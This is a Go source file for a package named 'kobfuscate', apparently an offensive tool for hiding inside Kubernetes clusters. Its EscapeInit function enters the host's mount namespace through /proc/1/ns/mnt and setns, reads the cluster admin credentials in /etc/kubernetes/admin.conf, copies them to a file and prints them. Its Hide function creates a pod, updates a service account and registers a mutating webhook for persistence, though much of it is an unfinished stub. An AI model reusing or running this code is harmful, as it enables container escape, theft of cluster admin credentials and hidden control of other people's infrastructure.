/*===========================================================================*\
 *           MIT License Copyright (c) 2022 Kris Nóva <kris@nivenly.com>     *
 *                                                                           *
 *                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                *
 *                ┃   ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗   ┃                *
 *                ┃   ████╗  ██║██╔═████╗██║   ██║██╔══██╗  ┃                *
 *                ┃   ██╔██╗ ██║██║██╔██║██║   ██║███████║  ┃                *
 *                ┃   ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║  ┃                *
 *                ┃   ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║  ┃                *
 *                ┃   ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝  ┃                *
 *                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                *
 *                                                                           *
 *                       This machine kills fascists.                        *
 *                                                                           *
\*===========================================================================*/

package kobfuscate

import (
	"context"
	"fmt"
	"io/ioutil"
	"time"

	"golang.org/x/sys/unix"

	v1 "k8s.io/api/core/v1"

	admissionregistrationv1 "k8s.io/api/admissionregistration/v1"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"github.com/sirupsen/logrus"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

type Runtime struct {
	namespace string
	client    *kubernetes.Clientset
}

const (
	DefaultServiceAccount string = "default"
	NamespaceLocation     string = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
	HostKubeconfig        string = "/root/host.kubeconfig"
)

var (
	RuntimeTimeout time.Duration = time.Second * 3
)

func NewRuntime() *Runtime {
	return &Runtime{}
}

// Todo we will need a "Generic" way to hide things in Kube
// Todo What will our "hide" input look like? maybe labels?

func (r *Runtime) Hide() error {

	// Create Cert Material
	// Register Cert Material
	// Start Webhook server

	pod := &v1.Pod{}
	_, err := r.Client().CoreV1().Pods(r.Namespace()).Create(context.TODO(), pod, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("unable to create pod for self: %v", err)
	}

	// Service Account for Mutating Webhook
	// Get the default service account
	serviceAccount, err := r.Client().CoreV1().ServiceAccounts(r.Namespace()).Get(context.TODO(), DefaultServiceAccount, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("unable to get service account for self: %v", err)
	}
	logrus.Infof("ServiceAccount: %s", serviceAccount)
	serviceAccount, err = r.Client().CoreV1().ServiceAccounts(r.Namespace()).Update(context.TODO(), serviceAccount, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("unable to update service account for self: %v", err)
	}
	logrus.Infof("Updated ServiceAccount")
	logrus.Infof("ServiceAccount: %s", serviceAccount)

	// Create a mutating webhook config
	m := &admissionregistrationv1.MutatingWebhookConfiguration{
		TypeMeta: metav1.TypeMeta{
			Kind:       "",
			APIVersion: "",
		},
		ObjectMeta: metav1.ObjectMeta{
			Name:                       "",
			GenerateName:               "",
			Namespace:                  "",
			UID:                        "",
			ResourceVersion:            "",
			DeletionGracePeriodSeconds: nil,
			Labels:                     nil,
			Annotations:                nil,
			OwnerReferences:            nil,
			Finalizers:                 nil,
			ManagedFields:              nil,
		},
		Webhooks: []admissionregistrationv1.MutatingWebhook{
			{
				Name: "",
				ClientConfig: admissionregistrationv1.WebhookClientConfig{
					URL: nil,
					Service: &admissionregistrationv1.ServiceReference{
						Namespace: "",
						Name:      "",
						Path:      nil,
						Port:      nil,
					},
					CABundle: nil,
				},
				Rules:         nil,
				FailurePolicy: nil,
				MatchPolicy:   nil,
				NamespaceSelector: &metav1.LabelSelector{
					MatchLabels:      nil,
					MatchExpressions: nil,
				},
				ObjectSelector: &metav1.LabelSelector{
					MatchLabels:      nil,
					MatchExpressions: nil,
				},
				SideEffects:             nil,
				TimeoutSeconds:          nil,
				AdmissionReviewVersions: nil,
				ReinvocationPolicy:      nil,
			},
		},
	}

	_, err = r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Create(context.TODO(), m, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("unable to create mutating webhook configuration: %v", err)
	}

	for true {
		time.Sleep(time.Second * 1)
		// Ensure this over time
	}
	return nil
}

func (r *Runtime) EscapeInit() (bool, error) {

	// Enter the mount namespace of the host to grab our kubeconfig
	//pid1fd, err := unix.PidfdOpen(1, 0)

	pid1mntfd, err := unix.Open("/proc/1/ns/mnt", unix.O_RDONLY|unix.O_CLOEXEC, 0)
	if err != nil {
		return false, fmt.Errorf("unable to open pid 1 file descriptor: %v", err)
	}

	logrus.Infof("Pid1 File Descriptor: %d", pid1mntfd)

	// Setns flags: https://man7.org/linux/man-pages/man2/setns.2.html
	// CLONE_NEWNS = Mount Namespace
	err = unix.Setns(int(pid1mntfd), unix.CLONE_NEWNS)
	if err != nil {
		return false, fmt.Errorf("unable to enter pid1 mount namespace: %v", err)
	}

	// We have entered the host mount namespace
	kubeconfigdata, err := ioutil.ReadFile("/etc/kubernetes/admin.conf")
	if err != nil {
		return false, fmt.Errorf("unable to open /etc/kubernetes/admin.conf on host: %v", err)
	}

	err = ioutil.WriteFile(HostKubeconfig, kubeconfigdata, 755)
	if err != nil {
		return false, fmt.Errorf("unable to write host kubeconfig: %v", err)
	}

	fmt.Println(string(kubeconfigdata))
	return true, nil
}

// InClusterInit will ensure the client and see if we are running inside a cluster
func (r *Runtime) InClusterInit() (bool, error) {

	// Init client
	cfg, err := rest.InClusterConfig()
	if err != nil {
		return false, err
	}
	cfg.Timeout = RuntimeTimeout
	logrus.Infof("Host   : %s", cfg.Host)
	logrus.Infof("Client : %s", cfg)
	client, err := kubernetes.NewForConfig(cfg)
	if err != nil {
		return false, err
	}
	v, err := client.ServerVersion()
	if err != nil {
		return false, fmt.Errorf("unable to communicate with api server: %v", err)
	}
	logrus.Infof("Version: %s", v.String())

	// We have authenticated with Kubernetes, we can set the client
	r.client = client
	return true, nil
}

func (r *Runtime) Client() *kubernetes.Clientset {
	return r.client
}

func (r *Runtime) Namespace() string {
	if r.namespace == "" {
		bytes, err := ioutil.ReadFile(NamespaceLocation)
		if err != nil {
			return ""
		}
		r.namespace = string(bytes)
	}
	return r.namespace
}
